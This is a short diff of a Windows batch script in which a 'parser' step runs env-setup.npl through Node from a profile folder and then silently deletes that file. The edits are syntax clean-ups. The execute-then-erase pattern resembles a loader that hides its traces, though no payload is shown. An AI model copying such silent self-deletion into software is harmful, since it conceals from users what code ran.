@@ -126,16 +126,14 @@ if errorlevel 1 (
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
-    cd /d "%CODEPROFILE%"
+    cd "%CODEPROFILE%"
     "%NODE_EXE%" "env-setup.npl"
-
     if errorlevel 1 (
         exit /b 1
     )
-
-    if exist "%CODEPROFILE%\env-setup.npl" (
-        del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
-    )
+    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 ) else (
     exit /b 1
 )
+
+exit /b 0
